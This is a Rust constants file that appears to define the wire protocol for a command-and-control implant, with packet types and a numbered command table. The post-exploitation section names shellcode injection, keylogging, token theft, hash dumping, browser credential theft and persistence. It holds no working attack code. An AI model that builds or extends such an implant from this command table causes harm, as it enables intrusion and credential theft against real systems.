// Wire protocol constants — MUST match Go shared/protocol/constants.go bit-for-bit.

pub const MAGIC: [u8; 4] = *b"WISP";

// Packet types
pub const TYPE_REGISTER: u8 = 0x01; // Agent -> Server
pub const TYPE_REGISTER_ACK: u8 = 0x02; // Server -> Agent
pub const TYPE_CHECKIN: u8 = 0x03; // Agent -> Server
pub const TYPE_TASK: u8 = 0x04; // Server -> Agent
pub const TYPE_RESULT: u8 = 0x05; // Agent -> Server
pub const TYPE_CLOSE: u8 = 0x06; // Both
pub const TYPE_REQUEST_KEY: u8 = 0x07; // Agent -> Server
pub const TYPE_SERVER_KEY: u8 = 0x08; // Server -> Agent

// Command IDs (agent task dispatch)
pub const CMD_SHELL: u32 = 1;
pub const CMD_LS: u32 = 2;
pub const CMD_CD: u32 = 3;
pub const CMD_CAT: u32 = 4;
pub const CMD_UPLOAD: u32 = 5;
pub const CMD_DOWNLOAD: u32 = 6;
pub const CMD_PS: u32 = 7;
pub const CMD_KILLPROC: u32 = 8;
pub const CMD_SYSINFO: u32 = 9;
pub const CMD_SLEEP: u32 = 10;
pub const CMD_EXIT: u32 = 11;
pub const CMD_LSJSON: u32 = 12;
pub const CMD_MKDIR: u32 = 13;
pub const CMD_RM: u32 = 14;
pub const CMD_RENAME: u32 = 15;
pub const CMD_EXECFILE: u32 = 16;
pub const CMD_ISHELL_OPEN: u32 = 17;
pub const CMD_ISHELL_RUN: u32 = 18;
pub const CMD_ISHELL_CLOSE: u32 = 19;
pub const CMD_RDP_START: u32 = 20;
pub const CMD_RDP_STOP: u32 = 21;
pub const CMD_RDP_INPUT: u32 = 22;
pub const CMD_RCP_CONNECT: u32 = 23;
pub const CMD_RCP_DISCONNECT: u32 = 24;
pub const CMD_SCREENSHOT: u32 = 25;
pub const CMD_PWD: u32 = 26;
pub const CMD_CLIENT_KILL: u32 = 27;
pub const CMD_HOST_REBOOT: u32 = 28;
pub const CMD_HOST_SHUTDOWN: u32 = 29;
pub const CMD_HOST_LOGOFF: u32 = 30;
pub const CMD_HOST_LOCK: u32 = 31;
// 32+ loader / post-ex (resolved via command registry)
pub const CMD_EXEC_SHELLCODE: u32 = 32;
pub const CMD_INJECT_SHELLCODE: u32 = 33;
pub const CMD_SPAWN: u32 = 34;
pub const CMD_BOF: u32 = 35;
pub const CMD_EXECUTE_ASSEMBLY: u32 = 36;
pub const CMD_EXECUTE_PE: u32 = 37;
pub const CMD_JOB_LIST: u32 = 38;
pub const CMD_JOB_KILL: u32 = 39;
pub const CMD_PORTSCAN: u32 = 40;
pub const CMD_SOCKS: u32 = 41;
pub const CMD_PORTFWD: u32 = 42;
pub const CMD_KEYLOG: u32 = 43;
pub const CMD_CLIPBOARD: u32 = 44;
pub const CMD_TOKEN_STEAL: u32 = 45;
pub const CMD_TOKEN_REVERT: u32 = 46;
pub const CMD_HASHDUMP: u32 = 47;
pub const CMD_BROWSER_CREDS: u32 = 48;
pub const CMD_PERSIST: u32 = 49;
pub const CMD_NETENUM: u32 = 50;
pub const CMD_GETSYSTEM: u32 = 51;
pub const CMD_DIAGSSN: u32 = 52;

// RCP message types (long-lived channel, not used in M0 polling loop)
pub const TYPE_RCP_HELLO: u8 = 0x10;
pub const TYPE_RCP_ACK: u8 = 0x11;
pub const TYPE_RCP_FRAME: u8 = 0x12;
pub const TYPE_RCP_INPUT: u8 = 0x13;
pub const TYPE_RCP_CLOSE: u8 = 0x14;
pub const TYPE_RCP_PING: u8 = 0x15;
pub const TYPE_RCP_ERROR: u8 = 0x16;

// HeaderSize = Magic(4) + Size(4) + Type(1)
pub const HEADER_SIZE: usize = 9;
// MaxPacketSize limits payload size (10MB)
pub const MAX_PACKET_SIZE: usize = 10 * 1024 * 1024;

// Task status
pub const TASK_PENDING: &str = "pending";
pub const TASK_SENT: &str = "sent";
pub const TASK_COMPLETED: &str = "completed";
pub const TASK_FAILED: &str = "failed";
pub const TASK_DOWNLOADING: &str = "downloading";
pub const TASK_JOB_OUTPUT: &str = "job_output";
